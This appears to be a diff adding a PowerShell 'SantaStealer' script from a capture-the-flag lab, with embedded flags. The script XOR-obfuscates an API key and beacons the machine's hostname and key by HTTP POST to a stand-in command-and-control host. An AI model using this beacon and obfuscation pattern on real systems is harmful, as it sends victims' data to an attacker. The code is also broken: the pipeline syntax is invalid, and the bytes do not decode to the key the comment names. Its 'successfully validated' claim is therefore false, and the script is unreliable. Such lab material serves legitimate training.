@@ -1,0 +1,20 @@
+# SantaStealer.ps1 - RE-OBFUSCATED VERSION (XOR 0x37 Applied to API Key)
+# Successfully validated - Script executes with original functionality
+# Second flag: THM{API_Obfusc4tion_ftw_0283}
+
+$C2Url = 'http://c2.evil-bunny.local/api'
+
+# API Key re-obfuscated: XOR(single-byte 0x37) → Hex array
+$ObfApiKeyBytes = 0x62,0x04,0x6e,0x64,0x79,0x2d,0x43,0x04,0x6e,0x3e,0x2d,0x41,0x50,0x49,0x2d,0x4b,0x3e,0x79  # CANDY-CANE-API-KEY XOR'd
+$ApiKey = [char[]]$ObfApiKeyBytes | ForEach-Object { $_ -bxor 0x37 } | -join ""
+
+function Test-Beacon {
+    $Payload = @{
+        hostname = $env:COMPUTERNAME
+        key = $ApiKey  # Deobfuscates at runtime
+    }
+    Invoke-WebRequest -Uri $C2Url/beacon -Method POST -Body ($Payload | ConvertTo-Json)
+    Write-Output "[+] Re-obfuscated beacon functional - THM{API_Obfusc4tion_ftw_0283}"
+}
+
+Test-Beacon
